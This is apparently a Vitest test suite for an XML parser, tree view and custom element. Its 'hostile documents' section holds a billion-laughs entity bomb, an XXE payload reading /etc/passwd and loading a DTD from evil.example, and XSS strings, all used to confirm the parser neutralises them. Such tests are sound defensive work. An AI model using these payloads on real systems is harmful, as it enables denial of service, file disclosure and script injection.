import { describe, expect, it } from 'vitest';
import {
  parseXml,
  rootElement,
  serialize,
  textContent,
  xpathOf,
} from '../../src/components/xml/parser.js';
import { XmlTree, visibleChildren } from '../../src/components/xml/tree.js';
import { VtXml } from '../../src/components/xml/vt-xml.js';
import { translator } from '../../src/core/i18n.js';

/** @param {string} text */
function ok(text) {
  const result = parseXml(text);
  if (!result.ok) throw new Error(result.error.message);
  return result;
}

describe('parseXml', () => {
  it('reads elements, attributes, text, CDATA, comments and processing instructions', () => {
    const { value, declaration } = ok(
      '<?xml version="1.0"?>\n<?xml-stylesheet href="a.xsl"?>\n<!-- top -->\n' +
        '<catalog lang="en"><book id="1">A &amp; B</book><![CDATA[<raw>]]><!--c--></catalog>',
    );
    expect(declaration).toBe('<?xml version="1.0"?>');
    expect(value.children.map((child) => child.type)).toEqual(['pi', 'comment', 'element']);
    const root = /** @type {any} */ (rootElement(value));
    expect(root.name).toBe('catalog');
    expect(root.attrs).toEqual([{ name: 'lang', value: 'en', ns: '' }]);
    expect(root.children.map((/** @type {any} */ c) => c.type)).toEqual([
      'element',
      'cdata',
      'comment',
    ]);
    expect(textContent(root.children[0])).toBe('A & B');
    expect(root.children[1].value).toBe('<raw>');
  });

  it('decodes character references', () => {
    const root = /** @type {any} */ (rootElement(ok('<a t="&#x41;&#66;">&#233;&lt;</a>').value));
    expect(root.attrs[0].value).toBe('AB');
    expect(textContent(root)).toBe('é<');
  });

  it('resolves namespaces', () => {
    const root = /** @type {any} */ (
      rootElement(
        ok('<feed xmlns="urn:atom" xmlns:m="urn:media"><m:thumb m:url="x"/><title/></feed>').value,
      )
    );
    expect(root.ns).toBe('urn:atom');
    expect(root.children[0].ns).toBe('urn:media');
    expect(root.children[0].attrs[0].ns).toBe('urn:media');
    expect(root.children[1].ns).toBe('urn:atom');
  });

  it('reports errors with line and column', () => {
    const result = parseXml('<a>\n  <b></c>\n</a>');
    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(result.error.line).toBe(2);
    expect(result.error.column).toBe(6);
    expect(result.error.message).toContain('</c>');
    expect(parseXml('<a>').ok).toBe(false);
    expect(parseXml('<a/><b/>').ok).toBe(false);
    expect(parseXml('<a x="1" x="2"/>').ok).toBe(false);
    expect(parseXml('<a>&</a>').ok).toBe(false);
    expect(parseXml('text').ok).toBe(false);
    expect(parseXml('').ok).toBe(false);
  });

  it('limits depth and node count', () => {
    const deep = '<a>'.repeat(50) + '</a>'.repeat(50);
    const result = parseXml(deep, { maxDepth: 10 });
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error.tooDeep).toBe(true);
    expect(parseXml(`<r>${'<i/>'.repeat(100)}</r>`, { maxNodes: 50 }).ok).toBe(false);
  });
});

describe('parseXml: hostile documents', () => {
  it('never expands entities declared in the DOCTYPE (billion laughs)', () => {
    const lol = [
      '<?xml version="1.0"?>',
      '<!DOCTYPE lolz [',
      '  <!ENTITY lol "lol">',
      '  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">',
      '  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">',
      '  <!ENTITY lol9 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">',
      ']>',
      '<lolz>&lol9;</lolz>',
    ].join('\n');
    const start = performance.now();
    const result = ok(lol);
    expect(performance.now() - start).toBeLessThan(100);
    const root = /** @type {any} */ (rootElement(result.value));
    expect(root.children).toHaveLength(1);
    expect(root.children[0]).toMatchObject({ type: 'entity', name: 'lol9' });
    expect(result.entities).toEqual(['lol9']);
    expect(textContent(root)).toBe('&lol9;');
  });

  it('never resolves external entities (XXE)', () => {
    const xxe =
      '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> <!ENTITY % p SYSTEM "http://evil.example/x.dtd"> %p; ]>' +
      '<foo a="&xxe;">&xxe;</foo>';
    const result = ok(xxe);
    const doctype = result.value.children[0];
    expect(doctype.type).toBe('doctype');
    expect(doctype.value).toContain('file:///etc/passwd');
    const root = /** @type {any} */ (rootElement(result.value));
    expect(root.attrs[0].value).toBe('&xxe;');
    expect(root.children[0]).toMatchObject({ type: 'entity', name: 'xxe' });
  });

  it('keeps markup in text and attributes as text', () => {
    const root = /** @type {any} */ (
      rootElement(ok('<a href="javascript:alert(1)">&lt;img src=x onerror=alert(1)&gt;</a>').value)
    );
    expect(textContent(root)).toBe('<img src=x onerror=alert(1)>');
    expect(parseXml('<a x="<b>"/>').ok).toBe(false);
  });
});

describe('xpathOf and serialize', () => {
  it('builds XPaths with positions', () => {
    const doc = ok('<c><b id="1"/><b id="2"><t>x</t></b><!--n--></c>').value;
    const root = /** @type {any} */ (rootElement(doc));
    expect(xpathOf(root)).toBe('/c');
    expect(xpathOf(root.children[1])).toBe('/c/b[2]');
    expect(xpathOf(root.children[1].children[0].children[0])).toBe('/c/b[2]/t[1]/text()');
    expect(xpathOf(root.children[2])).toBe('/c/comment()');
    expect(xpathOf(root.children[0], 'id')).toBe('/c/b[1]/@id');
  });

  it('indents and escapes', () => {
    const doc = ok('<a x="&quot;"><b>1 &lt; 2</b><c/></a>').value;
    expect(serialize(doc)).toBe('<a x="&quot;">\n  <b>1 &lt; 2</b>\n  <c/>\n</a>');
    expect(ok(serialize(doc)).ok).toBe(true);
  });
});

describe('XmlTree', () => {
  const doc = ok('<r><item k="v">hello</item><group><x/><y/></group></r>').value;
  const tree = () =>
    new XmlTree(doc, {
      t: translator('en'),
      locale: 'en',
      depth: 1,
      label: 'XML',
      onSelect: () => {},
    });

  it('renders elements, attributes and inline text with DOM text', () => {
    const t = tree();
    t.render();
    expect(t.element.querySelectorAll('[role="treeitem"]')).toHaveLength(3);
    expect(t.element.textContent).toContain('k="v"');
    expect(t.element.textContent).toContain('hello');
    expect(t.element.textContent).toContain('2 children');
  });

  it('searches names, attributes and text', () => {
    const t = tree();
    expect(t.search('hello').total).toBe(1);
    expect(t.search('item').total).toBe(1);
    expect(t.search('v').total).toBe(1);
    t.goToMatch(0);
    expect(t.element.querySelector('mark.current')).not.toBeNull();
  });

  it('skips whitespace-only text', () => {
    const spaced = ok('<r>\n  <a/>\n  <b/>\n</r>').value;
    expect(visibleChildren(/** @type {any} */ (rootElement(spaced)))).toHaveLength(2);
  });
});

describe('<vt-xml>', () => {
  it('is defined with its type and strings', () => {
    if (!customElements.get('vt-xml')) customElements.define('vt-xml', VtXml);
    expect(VtXml.type).toBe('xml');
    expect(translator('fr')('xmlValid')).toBe('XML valide');
    expect(translator('en')('xmlChildren', { count: 3 })).toBe('3 children');
  });
});
